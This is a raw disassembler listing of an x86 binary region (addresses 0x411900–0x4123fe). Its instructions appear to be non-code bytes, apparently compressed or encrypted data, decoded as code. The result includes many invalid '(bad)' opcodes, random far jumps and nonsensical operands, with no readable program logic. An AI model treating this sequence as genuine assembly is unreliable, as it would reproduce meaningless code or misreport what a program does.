  411900:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411901:	sbb    DWORD PTR [ecx+0x70af745a],eax
  411907:	pop    edi
  411908:	pop    ebp
  411909:	mov    esp,0xbc5d6eaa
  41190e:	push   0x68ab935f
  411913:	pop    edi
  411914:	inc    ebp
  411915:	mov    esp,0x3b5152d2
  41191a:	push   edx
  41191b:	pop    edi
  41191c:	xor    eax,0x356e8a80
  411921:	mov    esp,0xde9c5a40
  411926:	cmp    BYTE PTR [ecx+0x5f30b40c],ch
  41192c:	add    BYTE PTR [eax-0x43f2a169],bl
  411932:	jmp    0x5874:0x18bbfd6f
  411939:	sub    DWORD PTR [ecx],edx
  41193b:	pop    edi
  41193c:	cmc    
  41193d:	jne    0x411960
  41193f:	addr16 in eax,dx
  411941:	mov    ebx,0xabf0e900
	...
  41196e:	add    BYTE PTR [eax],al
  411970:	fstp   QWORD PTR [ebp-0x23]
  411973:	mov    ebx,0xb3c0a8f0
  411978:	call   0x5474d9db
  41197d:	pop    esi
  41197e:	lds    edi,FWORD PTR [ebx-0x40309c7e]
  411984:	rcr    DWORD PTR [esi-0x4b],cl
  411987:	mov    ebx,0x97c05f52
  41198c:	imul   ebx,DWORD PTR [ebx-0x17],0xffffffcc
  411990:	jg     0x4119e5
  411992:	jmp    0x69b0dee7
  411997:	shl    BYTE PTR [ebp+0x6e2de8f1],0x5e
  41199e:	sti    
  41199f:	or     esp,DWORD PTR [esi-0x6f44fa2c]
  4119a5:	aam    0xff
  4119a7:	sub    eax,esi
  4119a9:	mul    al
  4119ab:	or     bh,bl
  4119ad:	pop    edx
  4119ae:	(bad)  
  4119af:	fadd   QWORD PTR [ebp+0x73]
  4119b2:	mov    ds:0xfe5db55f,al
  4119b7:	fdiv   QWORD PTR [ecx-0x6a1e8ba3]
  4119bd:	stos   BYTE PTR es:[edi],al
  4119be:	inc    si
  4119c0:	xchg   ebp,eax
  4119c1:	xchg   ebx,eax
  4119c2:	shl    ebp,0x3d
  4119c5:	or     BYTE PTR [ebx-0x4653ebb],cl
  4119cb:	xchg   edi,eax
  4119cc:	in     al,dx
  4119cd:	lock call DWORD PTR [edx-0xe8ba2ce]
	...
  4119fc:	add    BYTE PTR [eax],al
  4119fe:	in     eax,0x7
  411a00:	addr16 push ss
  411a02:	in     eax,0xd2
  411a04:	inc    esp
  411a05:	or     eax,0xb13226b1
  411a0a:	sbb    BYTE PTR [ebx-0x75],0xbc
  411a0e:	movhps xmm0,QWORD PTR [ecx-0x17]
  411a12:	mov    ebp,0x7e75001c
  411a17:	repz xchg ecx,eax
  411a19:	dec    ebp
  411a1a:	sbb    DWORD PTR [ebx+0x57],0xffffffd1
  411a1e:	sub    BYTE PTR ds:0x9b38e900,al
  411a24:	jae    0x411a14
  411a26:	(bad)  
  411a27:	jae    0x4119ef
  411a29:	cmp    dl,BYTE PTR [ebp+0x3a514f5c]
  411a2f:	pop    ebx
  411a30:	out    dx,eax
  411a31:	ja     0x411a48
  411a33:	mov    edi,0xb3a2863
  411a38:	call   FWORD PTR [edx+ecx*2]
  411a3b:	jae    0x411a0f
  411a3d:	jnp    0x411a33
  411a3f:	pop    esp
  411a40:	out    0xb5,eax
  411a42:	pop    edx
  411a43:	pop    esi
  411a44:	inc    BYTE PTR [edx+0x80153a]
  411a4a:	sbb    DWORD PTR [ecx+0x75],0x31a359fa
  411a51:	ror    BYTE PTR [esi-0x5f],0xfd
  411a55:	call   DWORD PTR [eax]
  411a57:	test   al,0xac
  411a59:	cmp    BYTE PTR [eax+0x2a],ch
  411a5c:	mov    ebx,0xfda58aff
  411a61:	jne    0x411a63
	...
  411a8b:	add    BYTE PTR [edi-0x4f],bl
  411a8e:	addr16 lock mov al,ss:0x5e5d
  411a94:	push   cs
  411a95:	cwde   
  411a96:	add    al,BYTE PTR [eax]
  411a98:	stos   BYTE PTR es:[edi],al
  411a99:	int3   
  411a9a:	jmp    0x9ac7:0x51a21b83
  411aa1:	mov    eax,ds:0x5927fffe
  411aa6:	mov    DWORD PTR [ebp+0x53],0x17000058
  411aad:	into   
  411aae:	inc    ebx
  411aaf:	or     al,0x94
  411ab1:	pusha  
  411ab2:	(bad)  
  411ab3:	je     0x411ac3
  411ab5:	outs   dx,BYTE PTR ds:[esi]
  411ab6:	mov    esi,0xc8fd352b
  411abb:	ret    0x5923
  411abe:	mov    ebx,0x591701
  411ac3:	jmp    0x411a4b
  411ac5:	(bad)  
  411ac6:	jnp    0x411ad8
  411ac8:	out    0x2c,eax
  411aca:	add    eax,0x89471a8b
  411acf:	sbb    al,dh
  411ad1:	sub    al,0xc
  411ad3:	call   FWORD PTR [edx]
  411ad5:	dec    edi
  411ad6:	call   0xfde39651
  411adb:	or     DWORD PTR [eax+edx*2+0x1dde0575],0xfffffff8
  411ae3:	jmp    0x411b4e
  411ae5:	pop    es
  411ae6:	and    eax,0xfda2d07f
  411aeb:	or     DWORD PTR [esi],edi
  411aed:	das    
  411aee:	mov    esp,0x57
	...
  411b17:	add    BYTE PTR [eax],al
  411b19:	add    bh,dl
  411b1b:	repnz add eax,DWORD PTR [eax]
  411b1e:	ds pop edi
  411b20:	add    al,0xeb
  411b22:	dec    ebp
  411b23:	icebp  
  411b24:	mov    esp,0x8b7f1307
  411b29:	inc    esp
  411b2a:	xchg   cl,bh
  411b2c:	dec    esi
  411b2d:	cld    
  411b2e:	dec    ecx
  411b2f:	into   
  411b30:	lds    eax,FWORD PTR [edi]
  411b32:	jg     0x411b46
  411b34:	or     al,0x89
  411b36:	add    ecx,DWORD PTR [edx]
  411b38:	mov    edx,DWORD PTR [edx+eiz*2+0x19]
  411b3c:	adc    eax,0x8d1a038b
  411b41:	push   esp
  411b42:	push   edx
  411b43:	ins    DWORD PTR es:[edi],dx
  411b44:	pop    esi
  411b45:	rol    DWORD PTR [ecx+0x33],0xa4
  411b49:	push   es
  411b4a:	mov    bh,0xb7
  411b4c:	mov    edx,0x45369388
  411b51:	xor    DWORD PTR ds:0xb59a306b,0xffffffae
  411b58:	push   es
  411b59:	and    DWORD PTR [esi+0x72],0x2d
  411b5d:	push   es
  411b5e:	gs xor ch,ch
  411b61:	shl    DWORD PTR ds:0x6448b74,1
  411b67:	stc    
  411b68:	dec    esi
  411b69:	cld    
  411b6a:	gs cmp eax,esi
  411b6d:	or     edi,DWORD PTR [esi]
  411b6f:	pop    ds
  411b70:	(bad)  
  411b71:	jmp    0x411b30
  411b73:	mov    ch,0xae
  411b75:	mov    al,ds:0x41f472
  411b7a:	daa    
  411b7b:	aaa    
  411b7c:	or     BYTE PTR [esi+0x0],dh
	...
  411ba7:	add    BYTE PTR [eax+0x49],al
  411baa:	(bad)  
  411bab:	enter  0x81fc,0x2
  411baf:	call   DWORD PTR [ebx]
  411bb1:	push   ds
  411bb2:	mov    al,BYTE PTR [eax+0x3e]
  411bb5:	call   0x8aa6:0x5ab967b8
  411bbc:	cli    
  411bbd:	bound  ebp,QWORD PTR [ebx+0x3e]
  411bc0:	stos   BYTE PTR es:[edi],al
  411bc1:	or     al,BYTE PTR [ecx-0x72a3fe04]
  411bc7:	mov    eax,0x2e864712
  411bcc:	inc    edx
  411bcd:	pop    esp
  411bce:	repz mov ebx,0xabe0e588
  411bd4:	icebp  
  411bd5:	imul   DWORD PTR [ebp-0x48]
  411bd8:	inc    esp
  411bd9:	fwait
  411bda:	cmc    
  411bdb:	jg     0x411b78
  411bdd:	pop    edx
  411bde:	jmp    0xe52684e6
  411be3:	mov    eax,0x2e4d62ea
  411be8:	pop    edx
  411be9:	jb     0x411c47
  411beb:	and    dl,BYTE PTR [ecx+0x5b]
  411bee:	jno    0x411c2e
  411bf0:	cmp    ah,BYTE PTR [eax]
  411bf2:	lods   al,BYTE PTR ds:[esi]
  411bf3:	adc    esi,DWORD PTR [ecx]
  411bf5:	fadd   DWORD PTR [ebx+eax*1+0x2e265b3e]
  411bfc:	dec    edx
  411bfd:	pop    edx
  411bfe:	xchg   ebp,eax
  411bff:	or     edx,DWORD PTR [esi]
  411c01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411c02:	mov    bh,BYTE PTR [eax-0x505b1ae0]
  411c08:	and    al,0xd0
  411c0a:	push   es
  411c0b:	inc    esi
	...
  411c34:	add    BYTE PTR [eax],al
  411c36:	or     al,BYTE PTR [edi+0x4f828c19]
  411c3c:	(bad)  
  411c3d:	fisttp QWORD PTR [ebp+0x4503a8e9]
  411c43:	sub    eax,0xc3e5025c
  411c48:	push   ecx
  411c49:	add    al,0x8e
  411c4b:	pop    edx
  411c4c:	pop    ebp
  411c4d:	or     al,0xd6
  411c4f:	ja     0x411c98
  411c51:	mov    bh,0xd8
  411c53:	pop    edx
  411c54:	cmp    eax,0xefd0d110
  411c59:	stos   DWORD PTR es:[edi],eax
  411c5a:	daa    
  411c5b:	mov    esi,0xe589b600
  411c60:	push   ebx
  411c61:	aad    0xbc
  411c63:	xchg   esp,eax
  411c64:	add    BYTE PTR [esp+edi*1],bl
  411c67:	inc    esi
  411c68:	dec    ecx
  411c69:	jo     0x411c6a
  411c6b:	dec    esi
  411c6c:	mov    ah,ah
  411c6e:	push   ecx
  411c6f:	jmp    0x43fe05b3
  411c74:	add    eax,0x14cfc918
  411c79:	sbb    cl,dl
  411c7b:	iret   
  411c7c:	clc    
  411c7d:	jbe    0x411cce
  411c7f:	arpl   ax,bp
  411c81:	lahf   
  411c82:	sbb    al,0x5a
  411c84:	inc    al
  411c86:	inc    esp
  411c87:	sbb    esi,DWORD PTR [ebx+ebp*8-0x6c]
  411c8b:	jg     0x411cdc
  411c8d:	push   esi
  411c8e:	das    
  411c8f:	push   ebx
  411c90:	(bad)  
  411c91:	aam    0x91
  411c93:	inc    edx
  411c94:	adc    al,0xc8
  411c96:	mov    BYTE PTR [ecx-0x2],bl
  411c99:	mov    ah,0x0
	...
  411cc3:	add    BYTE PTR [ecx-0x7736f7be],dl
  411cc9:	pop    ecx
  411cca:	cmp    al,0xe9
  411ccc:	cmp    eax,0x3f9f069b
  411cd1:	inc    esi
  411cd2:	or     DWORD PTR [edx+0x67],ebp
  411cd5:	dec    edi
  411cd6:	add    DWORD PTR [ebx+eiz*4+0x4f0e1945],ebx
  411cdd:	push   edi
  411cde:	jmp    0xfe9b863d
  411ce3:	es jg  0x411d3d
  411ce6:	add    ecx,ebp
  411ce8:	cmp    eax,0x49a4895b
  411ced:	and    al,BYTE PTR [ecx]
  411cef:	jmp    0xde417831
  411cf4:	cs push ebx
  411cf6:	jmp    0xfe9b5dd0
  411cfb:	bound  edi,QWORD PTR [esi+0x57]
  411cfe:	enter  0xa500,0x6d
  411d02:	add    BYTE PTR [ebp+0x4c],dl
  411d05:	add    dl,BYTE PTR [edi-0x75]
  411d08:	adc    ah,BYTE PTR [ebx-0x7f]
  411d0b:	rcr    BYTE PTR [edi+0x40fce8ad],0x12
  411d12:	dec    DWORD PTR [ebx+0xc7510df]
  411d18:	sbb    BYTE PTR [ecx-0x1],bl
  411d1b:	jne    0x411cb4
  411d1d:	loopne 0x411d65
  411d1f:	add    al,0x24
  411d21:	xchg   ebx,eax
  411d22:	or     al,0x0
  411d24:	xchg   ebx,eax
  411d25:	pusha  
  411d26:	std    
  411d27:	jne    0x411d29
	...
  411d51:	add    BYTE PTR [ebx+0x570846e2],bl
  411d57:	adc    dh,BYTE PTR [ebp+0x8]
  411d5a:	movq   mm5,QWORD PTR [eax-0x1]
  411d5e:	or     ch,ah
  411d60:	inc    esp
  411d61:	adc    al,0xde
  411d63:	push   ebp
  411d64:	mov    dh,0x1
  411d66:	addr16 pop ebp
  411d68:	add    BYTE PTR [edi+0xe],bl
  411d6b:	sbb    al,0xe
  411d6d:	add    BYTE PTR [edx+0x1383e9e4],dh
  411d73:	or     cl,BYTE PTR [ebx+0x1a1355]
  411d79:	add    BYTE PTR [edi],ah
  411d7b:	pop    ebp
  411d7c:	add    BYTE PTR [ebx],ch
  411d7e:	or     DWORD PTR gs:[ebp+0xc],eax
  411d82:	push   ss
  411d83:	pop    ebp
  411d84:	add    BYTE PTR [eax],al
  411d86:	clc    
  411d87:	call   0x60fba14b
  411d8c:	add    BYTE PTR [ebp-0x1c],dh
  411d8f:	adc    DWORD PTR [ebp+0x14],esi
  411d92:	mov    ebp,0xbd006a5d
  411d97:	pop    esp
  411d98:	call   0xff4ff62d
  411d9d:	jmp    0x417af0
  411da2:	lds    esi,FWORD PTR ds:0xdfaf3f0c
  411da9:	dec    BYTE PTR [ebx+0x32]
  411dac:	mov    ch,0x74
  411dae:	sub    dh,BYTE PTR ss:[ecx]
  411db1:	(bad)  
  411db3:	adc    DWORD PTR [edx+0x44],ecx
	...
  411ddd:	add    BYTE PTR [eax],al
  411ddf:	add    BYTE PTR [edx+0x24142e09],bh
  411de5:	inc    edx
  411de6:	sub    BYTE PTR [ebx+edi*4],al
  411de9:	jg     0x411da3
  411deb:	dec    edi
  411dec:	xchg   esi,eax
  411ded:	imul   esi,DWORD PTR [ebx+0x4db99fe],0x81423e02
  411df7:	jl     0x411e33
  411df9:	inc    esp
  411dfa:	das    
  411dfb:	and    eax,DWORD PTR [ecx-0xc00eda9]
  411e01:	cmp    DWORD PTR [edx-0x4c3f23e3],ebp
  411e07:	mov    BYTE PTR [ebx],al
  411e09:	mov    dh,0xb3
  411e0b:	je     0x411e57
  411e0d:	sbb    al,0x2
  411e0f:	push   0x42
  411e11:	mov    bh,0x3d
  411e13:	cld    
  411e14:	out    dx,al
  411e15:	test   eax,0x9949fef6
  411e1a:	test   eax,0x2423fd6
  411e1f:	cmp    DWORD PTR [ebx+0x5e750136],0xffffff81
  411e26:	sub    eax,0xb5459410
  411e2b:	je     0x411e63
  411e2d:	pop    edx
  411e2e:	inc    edi
  411e2f:	bound  ebx,QWORD PTR [ecx]
  411e31:	imul   esi,DWORD PTR [ebx+0xec2a74],0x1ec3e6a
  411e3b:	call   0xfef66f66
  411e40:	out    0x92,eax
  411e42:	add    DWORD PTR [eax],eax
	...
  411e6c:	add    BYTE PTR [eax],al
  411e6e:	ds pop ebx
  411e70:	push   0x36
  411e72:	cmp    bl,BYTE PTR [edi+0x54]
  411e75:	loope  0x411e57
  411e77:	int    0xf7
  411e79:	mov    ah,0x52
  411e7b:	arpl   WORD PTR [edi-0x38a7a1a0],di
  411e81:	mov    al,BYTE PTR [edx+0x2a2ebf57]
  411e87:	(bad)
  411e8a:	inc    edx
  411e8b:	out    0x24,al
  411e8d:	mov    eax,0xb5974301
  411e92:	test   al,0x57
  411e94:	xchg   ecx,eax
  411e95:	mov    edi,DWORD PTR [esi]
  411e97:	pop    ebx
  411e98:	out    0x80,eax
  411e9a:	sbb    ah,BYTE PTR [edi-0x1c]
  411e9d:	sub    DWORD PTR cs:[eax-0x3],ebx
  411ea1:	adc    edx,DWORD PTR [ecx+eiz*2]
  411ea4:	jle    0x411ed4
  411ea6:	ss inc ebx
  411ea8:	je     0x411ecc
  411eaa:	jns    0x411f03
  411eac:	xor    BYTE PTR [edx],al
  411eae:	ds pop ebx
  411eb0:	out    0xaa,eax
  411eb2:	aam    0x59
  411eb4:	out    0x3,eax
  411eb6:	mov    ebp,0xd2fde3d5
  411ebb:	jp     0x411f0b
  411ebd:	(bad)
  411ec2:	shl    BYTE PTR [edx+0x4f],cl
  411ec5:	aam    0xde
  411ec7:	push   edi
  411ec8:	aaa    
  411ec9:	mov    ah,0xb2
  411ecb:	outs   dx,DWORD PTR ds:[esi]
  411ecc:	rol    DWORD PTR [eax],0xa4
  411ecf:	pop    ebx
  411ed0:	xchg   ecx,eax
  411ed1:	add    eax,DWORD PTR [eax]
	...
  411efb:	add    BYTE PTR [esi],dl
  411efd:	or     BYTE PTR [esi],bl
  411eff:	mov    ah,0x20
  411f01:	inc    ebp
  411f02:	lods   eax,DWORD PTR ds:[esi]
  411f03:	add    bh,BYTE PTR [esi]
  411f05:	pop    ebx
  411f06:	push   0x36
  411f08:	inc    edx
  411f09:	pop    esi
  411f0a:	jl     0x411eef
  411f0c:	or     cl,dl
  411f0e:	xlat   BYTE PTR ds:[ebx]
  411f0f:	sub    DWORD PTR [esi],esi
  411f11:	push   esi
  411f12:	add    DWORD PTR [ebp+eax*2+0x43],edi
  411f16:	mov    eax,0xfe55aa88
  411f1b:	pop    esp
  411f1c:	inc    esi
  411f1d:	rol    DWORD PTR [ecx],0x53
  411f20:	cmp    al,cl
  411f22:	add    cl,al
  411f24:	les    ebx,FWORD PTR [eax-0x2]
  411f27:	into   
  411f28:	mov    bl,0x75
  411f2a:	(bad)  
  411f2b:	call   0xedbcf96d
  411f30:	(bad)
  411f33:	scas   al,BYTE PTR es:[edi]
  411f34:	pop    es
  411f35:	push   edi
  411f36:	add    ecx,ebp
  411f38:	cmp    eax,0x461cfd5b
  411f3d:	rol    DWORD PTR [eax],0x13
  411f40:	ss call 0x4333b489
  411f46:	gs (bad) 
  411f48:	int    0x55
  411f4a:	call   0x9c61d3
  411f4f:	push   0x4f
  411f51:	addr16 pop es
  411f53:	cld    
  411f54:	dec    ecx
  411f55:	push   ds
  411f56:	inc    esp
  411f57:	ins    DWORD PTR es:[edi],dx
  411f58:	cmp    ebx,DWORD PTR [ebx+0x0]
  411f5b:	jmp    0xd355ef0c
	...
  411f88:	add    BYTE PTR [eax],al
  411f8a:	cmp    eax,0x76404c1
  411f8f:	push   edi
  411f90:	push   ecx
  411f91:	inc    ecx
  411f92:	clc    
  411f93:	push   esp
  411f94:	inc    BYTE PTR [esi-0x55]
  411f97:	xor    DWORD PTR [ecx],eax
  411f99:	jmp    0xe5bcf9db
  411f9e:	cmp    ecx,edi
  411fa0:	or     dh,BYTE PTR [ecx+0x3a]
  411fa3:	pop    ebx
  411fa4:	add    cl,ch
  411fa6:	retf   0x120
  411fa9:	jmp    0xe5bcf9eb
  411fae:	sbb    bh,cl
  411fb0:	or     dl,BYTE PTR [ecx+0x3a]
  411fb3:	pop    ebx
  411fb4:	add    BYTE PTR [eax],al
  411fb6:	pop    ss
  411fb7:	idiv   DWORD PTR [edx-0x7ea5e900]
  411fbd:	jge    0x411fa2
  411fbf:	push   ebp
  411fc0:	jo     0x412017
  411fc2:	fsubr  QWORD PTR [edi]
  411fc4:	jb     0x412017
  411fc6:	push   esi
  411fc7:	mov    ecx,DWORD PTR [eax+eax*1]
  411fca:	xlat   BYTE PTR ds:[ebx]
  411fcb:	cdq    
  411fcc:	push   es
  411fcd:	jae    0x411fee
  411fcf:	or     dh,BYTE PTR [ebp+0xc]
  411fd2:	jo     0x411f77
  411fd4:	hlt    
  411fd5:	xor    DWORD PTR [edx+0x13],0xa
  411fd9:	shl    DWORD PTR [edx+0x13],1
  411fdc:	push   DWORD PTR [ebp-0x5]
  411fdf:	icebp  
  411fe0:	add    BYTE PTR [esi-0x20],ah
  411fe3:	or     BYTE PTR [ecx+0x7508df45],cl
  411fe9:	adc    al,al
  411feb:	xchg   edx,eax
  411fec:	hlt    
  411fed:	inc    DWORD PTR [eax]
	...
  412017:	add    BYTE PTR [edx],bh
  412019:	pop    es
  41201a:	push   DWORD PTR [ebp-0x61]
  41201d:	icebp  
  41201e:	pop    ecx
  41201f:	pusha  
  412020:	ror    BYTE PTR [eax],0xff
  412023:	jne    0x412090
  412025:	ja     0x412029
  412027:	(bad)  
  412028:	jp     0x412037
  41202a:	push   DWORD PTR [ebp-0x11]
  41202d:	icebp  
  41202e:	sar    ch,1
  412030:	loopne 0x41203a
  412032:	push   DWORD PTR [ebp-0x21]
  412035:	icebp  
  412036:	mov    ebx,0xb608f065
  41203b:	add    DWORD PTR [edi+0x59],esp
  41203e:	add    bl,ch
  412040:	ja     0x41201e
  412042:	jl     0x412050
  412044:	push   edx
  412045:	(bad)  
  412046:	push   ebx
  412047:	or     edx,DWORD PTR [ebp-0x6d]
  41204a:	dec    edi
  41204b:	and    edx,0xd7fffe54
  412051:	bound  esi,QWORD PTR [ecx+0x48]
  412054:	inc    eax
  412055:	xchg   ebx,eax
  412056:	or     al,0x8f
  412058:	ds pop es
  41205a:	mov    dh,0x82
  41205c:	mov    ds:0x9bd1006e,eax
  412061:	push   esi
  412062:	mov    al,0x74
  412064:	or     ch,BYTE PTR [ebx+0x67]
  412067:	fs stc 
  412069:	dec    ebp
  41206a:	jp     0x4120b0
  41206c:	test   BYTE PTR [ebp+0x36],0x10
  412070:	jmp    0x6c3fd92c
  412075:	cmp    dh,BYTE PTR [eax+0x21a4674]
  41207b:	pusha  
	...
  4120a4:	add    BYTE PTR [eax],al
  4120a6:	shl    DWORD PTR ds:0xa83274b0,1
  4120ac:	add    edi,edi
  4120ae:	dec    ebx
  4120af:	push   cs
  4120b0:	mov    al,0x74
  4120b2:	mov    dh,0x1a
  4120b4:	cmp    edi,ebp
  4120b6:	mov    cl,0x5
  4120b8:	mov    al,0x74
  4120ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4120bb:	jmp    0x6c:0xf5a16523
  4120c2:	ds inc edx
  4120c4:	add    ch,bl
  4120c6:	cmp    ebp,DWORD PTR [edx+0x423e0004]
  4120cc:	mov    ebx,0x57422ec1
  4120d1:	mov    ebp,DWORD PTR [edx+0x74]
  4120d4:	cmp    DWORD PTR [esi+eax*2+0x42],0x37
  4120d9:	add    eax,0x3c68b08
  4120de:	ds leave 
  4120e0:	xor    eax,0xb1386508
  4120e5:	xor    eax,0xff256a66
  4120ea:	dec    ecx
  4120eb:	ror    edx,0x3
  4120ee:	mov    ebp,0x2f750254
  4120f3:	lea    esi,ds:0x255a2608
  4120f9:	jmp    FWORD PTR [ecx]
  4120fb:	pop    ebx
  4120fc:	lds    edi,FWORD PTR [edx+0x56e75eff]
  412102:	lds    eax,FWORD PTR [esi+0x63]
  412105:	inc    edi
  412106:	inc    esi
  412107:	loopne 0x4120bd
  412109:	inc    DWORD PTR [eax]
	...
  412133:	add    BYTE PTR [esi+ebx*2+0x6b828557],dh
  41213a:	out    0x37,eax
  41213c:	inc    ecx
  41213d:	loopne 0x4120db
  41213f:	adc    esi,ecx
  412141:	mov    bl,BYTE PTR [esi+0x6]
  412144:	mov    ebp,0x6a03fbd5
  412149:	arpl   WORD PTR [edx+0x56],si
  41214c:	xor    dl,BYTE PTR [eax+ebx*2+0x8]
  412150:	rcr    DWORD PTR [eax+0x6a],0x2e
  412154:	es pop ebx
  412156:	cmp    edi,ebx
  412158:	mov    ah,0xad
  41215a:	fist   WORD PTR [ebx-0x37]
  41215d:	pop    eax
  41215e:	push   0x5
  412160:	inc    esi
  412161:	and    ch,BYTE PTR [edx+0x72ae3e17]
  412167:	lahf   
  412168:	mov    esp,0xf058bc1e
  41216d:	fild   QWORD PTR [esp+edx*1]
  412170:	jns    0x4121cc
  412172:	out    0x3,eax
  412174:	ds pop ebx
  412176:	jb     0x4121be
  412178:	xor    bl,BYTE PTR [eax+ebp*8]
  41217b:	add    edi,DWORD PTR [esi]
  41217d:	pop    ebx
  41217e:	out    0x84,eax
  412180:	repnz (bad) 
  412182:	out    0x36,eax
  412184:	and    BYTE PTR ss:[edi],0x51
  412188:	add    DWORD PTR [edx],esp
  41218a:	sub    bh,bh
  41218c:	pop    ecx
  41218d:	push   esp
  41218e:	(bad)  
  412190:	pop    ecx
  412191:	in     eax,dx
  412192:	stos   DWORD PTR es:[edi],eax
  412193:	mov    al,0x48
  412195:	pop    edi
  412196:	daa    
  412197:	add    BYTE PTR ss:[eax],al
	...
  4121c2:	and    BYTE PTR ss:[edi],0x51
  4121c6:	cdq    
  4121c7:	and    al,0x1
  4121c9:	sub    esi,DWORD PTR [ecx]
  4121cb:	push   ebx
  4121cc:	mov    DWORD PTR [ebp+edx*8-0x3a0e8baf],esp
  4121d3:	add    eax,0x19ce1e5f
  4121d8:	inc    esp
  4121d9:	sbb    eax,0xe9005b3c
  4121de:	mov    BYTE PTR [edi-0x687f6614],dl
  4121e4:	hlt    
  4121e5:	cdq    
  4121e6:	scas   al,BYTE PTR es:[edi]
  4121e7:	(bad)  
  4121e8:	or     BYTE PTR [ecx],al
  4121ea:	push   ss
  4121eb:	push   ebp
  4121ec:	(bad)  
  4121ed:	out    dx,al
  4121ee:	xlat   BYTE PTR ds:[ebx]
  4121ef:	xchg   edi,eax
  4121f0:	in     al,dx
  4121f1:	pop    esi
  4121f2:	in     al,0xdd
  4121f4:	jnp    0x4121cb
  4121f6:	inc    edx
  4121f7:	mov    DWORD PTR [edx+eiz*8],0x208ceef
  4121fe:	add    dh,BYTE PTR [ecx+0x66fcb05d]
  412204:	add    BYTE PTR [edx],dl
  412206:	pop    es
  412207:	aas    
  412208:	mov    BYTE PTR [edx+edx*8],ch
  41220b:	fstp   TBYTE PTR [ebx-0x3f]
  41220e:	inc    edx
  41220f:	pop    ebx
  412210:	mov    al,ds:0x29636be9
  412215:	test   eax,0xabc7b208
  41221a:	ds pop ebx
  41221c:	mov    DWORD PTR [edx+ebp*4],esp
  41221f:	sbb    esp,ecx
  412221:	jmp    0x412210
  412223:	inc    edx
  412224:	imul   eax,DWORD PTR ds:0x0,0x0
	...
  41224e:	add    BYTE PTR [eax],al
  412250:	test   eax,0xae2c8851
  412255:	in     eax,0xf8
  412257:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412258:	div    DWORD PTR [esi]
  41225a:	add    ecx,ebp
  41225c:	cmp    eax,0xbf1ae95b
  412261:	xchg   edi,eax
  412262:	lock mov ecx,0xb9f497be
  412268:	cwde   
  412269:	(bad)  
  41226a:	or     BYTE PTR [eax],al
  41226c:	out    dx,eax
  41226d:	cmp    edx,0x4cd678ff
  412273:	lock sub al,0x9b
  412276:	call   0xd09645f2
  41227b:	je     0x4122a4
  41227d:	add    DWORD PTR [ebp-0x4],esi
  412280:	das    
  412281:	bound  esp,QWORD PTR [edi+edi*8+0x28]
  412285:	ss mov esi,0xc00ed85e
  41228b:	or     al,0x17
  41228d:	das    
  41228e:	dec    ebp
  41228f:	call   0xac25c58c
  412294:	fs mov eax,gs
  412297:	add    BYTE PTR [ecx+0x58],dh
  41229a:	cmp    DWORD PTR [ebp+0x3],0x64c1735e
  4122a1:	mov    ebp,eax
  4122a3:	add    BYTE PTR [edx+0x59],dh
  4122a6:	cmp    DWORD PTR [ebp-0xd],0xf810735d
  4122ad:	xchg   edx,eax
  4122ae:	cld    
  4122af:	call   0x3e9fab
	...
  4122dc:	add    BYTE PTR [eax],al
  4122de:	cmp    al,0x17
  4122e0:	pop    esp
  4122e1:	pop    edi
  4122e2:	ficomp WORD PTR [ebx]
  4122e4:	or     al,BYTE PTR [eax]
  4122e6:	adc    al,0x8b
  4122e8:	in     al,0x0
  4122ea:	xor    ah,BYTE PTR [edi+eiz*8-0x75]
  4122ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4122ef:	pop    ebp
  4122f0:	add    BYTE PTR [ebx+0x75fd6762],cl
  4122f6:	mov    bl,0xd0
  4122f8:	std    
  4122f9:	mov    ah,BYTE PTR [edx]
  4122fb:	add    eax,ecx
  4122fd:	loopne 0x412364
  4122ff:	lods   eax,DWORD PTR ds:[esi]
  412300:	call   0xff4357e5
  412305:	mov    DWORD PTR [edx+0x1b7d8b21],edx
  41230b:	aad    0x74
  41230d:	cld    
  41230e:	ds popf 
  412310:	dec    ecx
  412311:	lods   eax,DWORD PTR ds:[esi]
  412312:	mov    ch,0x93
  412314:	mov    BYTE PTR [esi+ebx*2+0x43],0x2
  412319:	add    BYTE PTR [esi],bh
  41231b:	mov    edi,0xb78ee048
  412320:	dec    eax
  412321:	hlt    
  412322:	mov    ?,esp
  412324:	scas   al,BYTE PTR es:[edi]
  412325:	je     0x41235d
  412327:	push   0xffffff9e
  412329:	cli    
  41232a:	sbb    DWORD PTR [edx-0x6],esi
  41232d:	mov    edi,0x7c83368a
  412332:	adc    al,BYTE PTR [ebx+0x36]
  412335:	push   es
  412336:	mov    ebp,0x72ffa1d7
  41233b:	sbb    BYTE PTR [ebx+0x3642de7c],al
  412341:	or     BYTE PTR [eax],al
	...
  41236b:	add    cl,ch
  41236d:	(bad)  
  41236e:	mov    eax,ds:0xaba5bbe7
  412373:	(bad)  
  412374:	fldenv [edi+0x2824e7d0]
  41237a:	lods   al,BYTE PTR ds:[esi]
  41237b:	dec    cl
  41237d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41237e:	mov    al,0xe7
  412380:	dec    ebx
  412381:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412382:	stos   DWORD PTR es:[edi],eax
  412383:	(bad)  
  412384:	add    cl,BYTE PTR gs:[edi+0x5f]
  412388:	xchg   DWORD PTR [ecx+eax*1],eax
  41238b:	add    BYTE PTR [ebp-0x5e555b89],dh
  412391:	xchg   DWORD PTR [eax+0x4d61b82],ebp
  412397:	je     0x4123d1
  412399:	lds    ebp,FWORD PTR ds:0x90673ef4
  41239f:	mov    bh,bl
  4123a1:	inc    ebp
  4123a2:	lods   eax,DWORD PTR ds:[esi]
  4123a3:	je     0x41233f
  4123a5:	rol    DWORD PTR [edi+edi*8],0xeb
  4123a9:	lds    ebx,FWORD PTR [ecx+ecx*2-0x48543f23]
  4123b0:	aas    
  4123b1:	pop    ebx
  4123b2:	out    0x3,eax
  4123b4:	ds mov cl,0xbe
  4123b7:	mov    edx,0x56e75f7f
  4123bc:	mov    ch,0x3f
  4123be:	imul   ecx,eax,0x79
  4123c1:	test   al,0x6a
  4123c3:	das    
  4123c4:	dec    esi
  4123c5:	pop    ebx
  4123c6:	mov    ah,0xf9
  4123c8:	jmp    0x3e450b26
  4123cd:	mov    al,0x20
  4123cf:	ret    0x0
	...
  4123fa:	dec    ebp
  4123fb:	pop    ebx
  4123fc:	es aas 
  4123fe:	test   BYTE PTR cs:[ecx],bh
